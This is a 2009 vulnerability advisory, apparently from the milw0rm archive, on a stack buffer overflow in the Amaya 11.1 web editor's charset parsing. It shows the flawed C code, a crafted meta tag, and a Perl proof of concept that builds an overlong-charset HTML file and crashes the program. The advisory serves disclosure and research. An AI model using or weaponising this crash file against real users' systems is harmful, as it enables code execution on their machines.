@@ -1,0 +1,164 @@
+#=cicatriz <c1c4tr1z@voodoo-labs.org>=#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~(advisories)=#
+				     /)           /)     /)                   
+			_ _  _______(/ ________  // _   (/_ _       _____  _  
+			(/__(_)(_)(_(_(_)(_)    (/_(_(_/_) /_)_ o  (_)/ (_(_/_
+						                         .-/  
+#=Amaya 11.1 XHTML Parser Buffer Overflow=#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~(_/~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=#
+#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=#
+#=Advisory & Vulnerability Information=#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=#
+
+	Title: Amaya 11.1 XHTML Parser Buffer Overflow
+	Advisory ID: VUDO-2009-0104
+	Advisory URL: http://research.voodoo-labs.org/advisories/2
+	Date founded: 2009-03-30
+	Vendors contacted: N/A
+	Class: Buffer Overflow
+	Remotely Exploitable: Yes
+	Locally Exploitable: Yes
+	Exploit/PoC Available: Yes
+
+#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=#
+#=Tested & Vulnerable packages=#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=#
+
+	[+] Amaya 11.1
+	[+] Amaya 11
+	
+	Non tested but possible:
+	[*] Amaya 10
+	
+#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=#
+#=Solutions and Workarounds=#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=#
+
+Amaya is planning to release a newer version (11.2 snapshot) [1]
+
+#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=#
+#=Technical Information=#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=#
+
+A stack buffer overflow have been discovered in the Amaya [1] Web Editor's XHTML parser function:
+ParseCharsetAndContentType(), wich can be used to compromise the victim's system via arbitrary code execution.
+ 
+The overflow occurs when the application process the "charset" type from a crafted HTML page.If the charset
+has a large amount of chars can lead to a stack buffer overflow and, maybe, be exploited using printable ASCII
+characters. When the application was debugged, it showed that the overflow occurs in the function 
+"ParseCharsetAndContentType":
+
++++Amaya/amaya/XHTMLbuilder.c
+
+    68	void ParseCharsetAndContentType (Element el, Document doc) 
+    69	
+    70	{
+    71	  AttributeType attrType;
+    72	  Attribute     attr;
+    73	  ElementType   elType;
+    74	  CHARSET       charset;
+    75	  char         *text, *text2, *ptrText, *str; XXX
+    76	  char          charsetname[MAX_LENGTH]; 
+    77	  int           length;
+    78	  int           pos, index = 0;
+    79	
+	...
+   125	
+   126	                      if (charset == UNDEFINED_CHARSET)
+   127	                        {
+   128	                          /* the charset is not already defined by the http header */
+   129	                          str = strstr (text2, "charset=");
+   130	                          if (str)
+   131	                            {
+   132	                              pos = str - text2 + 8;
+   133	                              while (text2[pos] != SPACE &&
+   134	                                     text2[pos] != TAB && text2[pos] != EOS)
+   135	                                charsetname[index++] = text2[pos++]; XXX
+   136	                              charsetname[index] = EOS;
+   137	                              charset = TtaGetCharset (charsetname);
+   138	                              if (charset != UNDEFINED_CHARSET)
+   139	                                TtaSetDocumentCharset (doc, charset, FALSE);
+   140	                            }
+   141	                        }
+   142	                      TtaFreeMemory (text2);
+   143	                    }       
+   144	                } 
+   145	            }
+   146	          TtaFreeMemory (text);
+   147	        }
+   148	    }
+
+---Amaya/amaya/XHTMLbuilder.c
+
+So, the application creates a buffer called "charsetname" with a length of 1024 bytes and then tries to fill
+it with the charset type name, skipping the 8 bytes of "charset=", without making any type of length check.
+If an HTML page has something like this it might produce the overflow:
+
++++
+<meta http-equiv="Content-Type" content="text/html; charset="AAAAAAAAAAAAAAAAAAAAAAAA...x1922" />
+---
+
+#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=#
+#=Proof of Concept=#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=#
+
+The following perl script creates an HTML file that reproduces the overflow:
+
++++amaya_poc.pl
+
+#!/usr/bin/perl -w
+
+# [*] Amaya 11.1 XHTML Parser Buffer Overflow POC
+# [*] C1c4Tr1Z <c1c4tr1z@voodoo-labs.org>
+## Copyright (c) 2008-2009 Voodoo Research Group.
+
+my $filename="b0f.html";
+my $b0f="x41"x1922;
+my $vulnerable=qq{
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset={b0f}">
+</head>
+
+<body>
+</body>
+</html>
+};
+#debug: "gdb -q --args "/usr/lib/Amaya/wx/bin/amaya_bin" ./$filename"
+my $exec="/usr/lib/Amaya/wx/bin/amaya_bin ./$filename";
+
+open(HTML, "> $filename") || die "[-] Error ($!). Exiting..n";
+$vulnerable=~s|({b0f})+|$b0f|g;
+print HTML $vulnerable;
+close(HTML);
+
+print "[+] File $filename created.n";
+print "[+] Setting enviroment variables..n";
+
+$ENV{'XLIB_SKIP_ARGB_VISUALS'}=1;
+$ENV{'G_SLICE'}="always-malloc";
+
+print "[+] Executing amayan";
+sleep(3);
+exec("clear; $exec");
+
+---amaya_poc.pl
+
++++console
+ $ perl amaya.pl
+[+] File b0f.html created.
+[+] Setting enviroment variables..
+[+] Executing amaya
+
+* Amaya: Error Irrecuperable ***Segmentation fault
+ $ 
+---
+
+#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=#
+#=Reporting Timeline=#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=#
+
+	[*] 30-03-2009: Bug discovered.
+	[*] 01-04-2009: Advisory VUDO-2009-3003 published without notifying the vendor.
+
+#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=#
+#=References=#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=#
+
+	[1] Amaya Project Homepage: http://www.w3.org/Amaya/
+
+#=cicatriz <c1c4tr1z@voodoo-labs.org>=#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~(advisories)=#
+#=mié 01 abr 2009 ART=#=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=#
+
+# milw0rm.com [2009-04-06]
